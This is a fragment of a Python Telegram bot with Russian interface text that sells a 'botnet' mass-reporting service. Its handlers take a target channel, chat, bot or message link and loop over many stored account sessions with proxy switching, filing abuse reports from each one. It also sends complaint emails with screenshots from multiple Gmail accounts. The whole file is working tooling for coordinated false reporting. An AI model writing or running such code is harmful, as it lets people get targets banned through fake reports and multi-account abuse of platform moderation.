    state = user_states.get(message.from_user.id, {})
    if state.get('step') != 'email_screenshots':
        return
    photo = message.photo[-1]
    file_path = f"screenshots/{photo.file_id}.jpg"
    await message.bot.download(photo, file_path)
    state['screenshots'].append(file_path)
    await message.answer(f"✅ Скриншот сохранен ({len(state['screenshots'])}).\nЕще или <code>готово</code>:", parse_mode="HTML")

async def send_email_report(message: types.Message):
    user_id = message.from_user.id
    remaining = check_and_reset_daily(user_id)
    if remaining <= 0 and not is_user_admin(user_id):
        await message.answer("⛔ <b>Лимит исчерпан!</b>", parse_mode="HTML")
        if user_id in user_states:
            del user_states[user_id]
        return
    state = user_states.get(user_id, {})
    if state.get('step') != 'email_screenshots':
        return
    on_cooldown, rem_cd = check_cooldown(user_id, 'email')
    if on_cooldown:
        return await message.answer(f"⏳ <b>Кулдаун!</b> {rem_cd // 60} мин.")
    await message.answer(f"📤 Рассылка...\n📎 Скриншотов: {len(state.get('screenshots', []))}")
    success_count, total_emails = 0, len(EMAIL_ACCOUNTS) * len(REPORT_EMAILS)
    for from_email, app_pwd in EMAIL_ACCOUNTS.items():
        for to_email in REPORT_EMAILS:
            try:
                msg = EmailMessage()
                msg['Subject'] = state['email_subject']
                msg['From'] = from_email
                msg['To'] = to_email
                msg.set_content(state['email_text'])
                for scr in state.get('screenshots', []):
                    if os.path.exists(scr):
                        with open(scr, 'rb') as f:
                            msg.add_attachment(f.read(), maintype='image', subtype='jpeg', filename=os.path.basename(scr))
                with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                    server.login(from_email, app_pwd)
                    server.send_message(msg)
                success_count += 1
                await asyncio.sleep(1.5)
            except:
                continue
    for scr in state.get('screenshots', []):
        if os.path.exists(scr):
            os.remove(scr)
    set_cooldown(user_id, 'email')
    status = 'success' if success_count > 0 else 'failed'
    save_report_to_history(user_id, 'Email', state['email_subject'], state['email_text'][:50] + "...", status)
    use_request(user_id, 'Email', state['email_subject'], state['email_text'][:50] + "...", status)
    await send_log_report('Email', state['email_subject'], 'Mass Report', success_count, total_emails, user_id)
    if user_id in user_states:
        del user_states[user_id]
    await message.answer(f"✅ Рассылка завершена!\n📧 Отправлено: {success_count}/{total_emails}\n\n⏳ Кулдаун: 5 минут")

# ==================== БОТНЕТ ====================
@dp.callback_query(F.data == "botnet_start")
async def botnet_start(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    if is_user_banned(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    remaining = check_and_reset_daily(callback.from_user.id)
    if remaining <= 0 and not is_user_admin(callback.from_user.id):
        return await safe_callback_answer(callback, "⛔ Лимит исчерпан!", show_alert=True)
    await safe_edit_or_send(callback.message, "🤖 <b>БОТНЕТ</b>\n\nВнутряк + Pyrogram репорт через обычные сессии.\n\nВыберите цель:", reply_markup=report_target_keyboard())

@dp.callback_query(F.data.in_(["report_channel", "report_chat", "report_bot", "report_message"]))
async def report_target_selected(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    if is_user_banned(user_id):
        return await safe_callback_answer(callback, "⛔", show_alert=True)
    remaining = check_and_reset_daily(user_id)
    if remaining <= 0 and not is_user_admin(user_id):
        return await safe_callback_answer(callback, "⛔ Лимит исчерпан!", show_alert=True)
    target = callback.data
    state = user_states.get(user_id, {})
    state['target_type'] = target
    user_states[user_id] = state
    if target in ["report_channel", "report_chat"]:
        state['step'] = 'wait_visibility'
        user_states[user_id] = state
        emoji, name = ("📢", "канал") if target == "report_channel" else ("💬", "чат")
        await safe_edit_or_send(callback.message, f"{emoji} <b>Репорт на {name}</b>\n\nВыберите тип:", reply_markup=visibility_keyboard(), parse_mode="HTML")
    elif target == "report_bot":
        state['step'] = 'report_target'
        user_states[user_id] = state
        await safe_edit_or_send(callback.message, "🤖 <b>Репорт на бота</b>\n\nОтправьте @username бота:", parse_mode="HTML")
    elif target == "report_message":
        state['step'] = 'report_target'
        user_states[user_id] = state
        await safe_edit_or_send(callback.message, "📄 <b>Репорт на сообщение</b>\n\nОтправьте ссылку:\n<code>https://t.me/username/123</code>", parse_mode="HTML")

@dp.callback_query(F.data.in_(["visibility_open", "visibility_closed"]))
async def visibility_selected(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    state = user_states.get(user_id, {})
    if state.get('step') != 'wait_visibility':
        return
    visibility = 'открытый' if callback.data == 'visibility_open' else 'закрытый'
    state['visibility'] = visibility
    state['step'] = 'report_scope'
    user_states[user_id] = state
    warning = "\n\n⚠️ В канал/чат должен быть заход без модератора." if visibility == 'закрытый' else ""
    await safe_edit_or_send(callback.message, f"📍 На что жалоба?{warning}", reply_markup=scope_keyboard())

@dp.callback_query(F.data.in_(["scope_full", "scope_message"]))
async def scope_selected(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    state = user_states.get(user_id, {})
    if state.get('step') != 'report_scope':
        return
    state['scope'] = 'весь' if callback.data == 'scope_full' else 'сообщение'
    state['step'] = 'report_link'
    user_states[user_id] = state
    await safe_edit_or_send(callback.message, "🔗 Отправьте ссылку-приглашение." if state.get('visibility') == 'закрытый' else "🔗 Отправьте ссылку на канал/чат.")

@dp.callback_query(F.data.startswith("reason_"))
async def handle_reason_callback(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    state = user_states.get(user_id, {})
    reason_str = callback.data.replace("reason_", "")
    if state.get('step') != 'report_reason':
        return
    on_cooldown, rem_cd = check_cooldown(user_id, 'botnet_report')
    if on_cooldown:
        await callback.message.answer(f"⏳ <b>Кулдаун!</b> {rem_cd // 60} мин.", parse_mode="HTML")
        return
    state['reason'] = reason_str
    state['step'] = 'executing_report'
    user_states[user_id] = state

    # ИСПРАВЛЕНО: Ботнет использует ТОЛЬКО обычные сессии (без Tida!)
    sessions = get_sessions_from_dir(SESSIONS_DIR)
    if not sessions:
        await safe_edit_or_send(callback.message, "❌ Обычные сессии не найдены!")
        return

    target = state['target_link']
    target_type = state['target_type']
    is_message_report = (target_type == 'report_message')
    message_id = state.get('message_id')

    # Для сообщения — полная ссылка в логах
    if is_message_report and message_id:
        target_for_log = f"https://t.me/{target}/{message_id}"
    else:
        target_for_log = target

    await safe_edit_or_send(callback.message, f"⏳ <b>БОТНЕТ</b>\nОтправка через {len(sessions)} сессий (внутряк + Pyrogram)...\n🎯 <code>{target}</code>", parse_mode="HTML")
    success_count, fail_count, not_found_count, revoked_count = 0, 0, 0, 0
    reason_obj = get_reason_obj(reason_str)

    clean_target = target.strip().lstrip('@')
    if clean_target.startswith('https://') or clean_target.startswith('http://'):
        clean_target = clean_target.split('://')[1]
    if clean_target.startswith('t.me/'):
        clean_target = clean_target[5:]
    if '/' in clean_target:
        clean_target = clean_target.split('/')[0]

    for session_file in sessions:
        try:
            temp_path = os.path.join(TEMP_SESSIONS_DIR, f"temp_{session_file.stem}.session")
            for attempt in range(3):
                try:
                    shutil.copy2(str(session_file), temp_path)
                    break
                except:
                    await asyncio.sleep(1)

            client = await create_working_client(temp_path)
            try:
                await client.connect()
            except Exception:
                switch_to_next_proxy()
                client = await create_working_client(temp_path)
                try:
                    await client.connect()
                except Exception:
                    await client.disconnect()
                    fail_count += 1
                    if os.path.exists(temp_path):
                        os.remove(temp_path)
                    continue

            try:
                await client.get_me()
            except Exception:
                await client.disconnect()
                fail_count += 1
                if os.path.exists(temp_path):
                    os.remove(temp_path)
                continue

            try:
                input_entity = await client.resolve_peer(clean_target)

                if is_message_report and message_id:
                    # Внутряк на сообщение (ПКМ → Пожаловаться)
                    try:
                        await client.invoke(Report(peer=input_entity, id=[message_id], option=b'', message=''))
                        success_count += 1
                    except TypeError:
                        try:
                            await client.invoke(ReportPeer(peer=input_entity, reason=reason_obj, message=""))
                            success_count += 1
                        except Exception:
                            raise
                    except Exception as e:
                        err_str = str(e).lower()
                        if "chat_admin_required" in err_str or "peer_id_invalid" in err_str:
                            try:
                                await client.invoke(ReportPeer(peer=input_entity, reason=reason_obj, message=""))
                                success_count += 1
                            except Exception:
                                raise
                        else:
                            raise
                else:
                    # Внутряк на канал/чат/бота (3 точки → Пожаловаться)
                    try:
                        await client.invoke(ReportPeer(peer=input_entity, reason=reason_obj, message=""))
                        success_count += 1
                    except Exception as e:
                        err_str = str(e).lower()
                        if "chat_admin_required" in err_str or "peer_id_invalid" in err_str:
                            raise
                        else:
                            raise
            except UsernameNotOccupied:
                not_found_count += 1
            except PeerIdInvalid:
                not_found_count += 1
            except (AuthKeyUnregistered, SessionRevoked, Unauthorized):
                revoked_count += 1
                try:
                    os.remove(session_file)
                except:
                    pass
            except Exception as e:
                print(f"Ошибка сессии {session_file.stem}: {e}")
                fail_count += 1

            await client.disconnect()
            if os.path.exists(temp_path):
                os.remove(temp_path)
            await asyncio.sleep(random.uniform(2, 4))
        except Exception as e:
            print(f"Критическая ошибка {session_file}: {e}")
            fail_count += 1
            continue

    set_cooldown(user_id, 'botnet_report')
    status = 'success' if success_count > 0 else 'failed'
    method_name = f"Botnet ({target_type})"
    save_report_to_history(user_id, method_name, target_for_log, reason_str, status)
    use_request(user_id, method_name, target_for_log, reason_str, status)
    await send_log_report(method_name, target_for_log, reason_str, success_count, len(sessions), user_id)
    if user_id in user_states:
        del user_states[user_id]
    result_msg = f"✅ <b>БОТНЕТ завершен!</b>\n\n✅ Успешно: {success_count}\n❌ Ошибок: {fail_count}\n"
    if not_found_count > 0:
        result_msg += f"⚠️ Не найдено: {not_found_count}\n"
    if revoked_count > 0:
        result_msg += f"🗑️ Отозвано: {revoked_count}\n"
    result_msg += f"\n⏳ Кулдаун: 5 минут."
    await safe_edit_or_send(callback.message, result_msg, parse_mode="HTML")

@dp.callback_query(F.data == "emails_menu")
async def emails_menu(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    if is_user_banned(user_id):
        return
    remaining = check_and_reset_daily(user_id)
    if remaining <= 0 and not is_user_admin(user_id):
        return await safe_callback_answer(callback, "⛔ Лимит исчерпан!", show_alert=True)
    user_states[user_id] = {'step': 'email_subject'}
    await safe_edit_or_send(callback.message, "📧 <b>Рассылка жалоб</b>\n\nВведите тему письма:", parse_mode="HTML")

@dp.callback_query(F.data == "tidabot_start")
async def tidabot_start(callback: types.CallbackQuery):
    await safe_callback_answer(callback)
    user_id = callback.from_user.id
    if is_user_banned(user_id):
        return
    remaining = check_and_reset_daily(user_id)
    if remaining <= 0 and not is_user_admin(user_id):
        return await safe_callback_answer(callback, "⛔ Лимит исчерпан!", show_alert=True)
    user_states[user_id] = {'step': 'tida_link'}
    await safe_edit_or_send(callback.message, "🎯 <b>TIDAbot</b>\n\nОтправьте ссылку (t.me/...):", parse_mode="HTML")

# ==================== ЗАПУСК ====================
async def main():
    print("🚀 Бот запущен (Pyrogram + Aiogram + GDPR + Botnet)...")
    print(f"👑 Админ ID: {ADMIN_ID}")
    print(f"🤖 Ботнет: только обычные сессии (внутряк + Pyrogram)")
    print(f"🎯 TIDAbot: только тида сессии (отдельный метод)")
    print(f"📢 Админка: Написать всем + Чендж лист")
    print(f"🎁 Награды: Tida=1, +1=1, DC2=3, DC4/DC5=2")
    print(f"🌐 Прокси: {len(PROXY_LIST)} шт. (автопереключение)")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())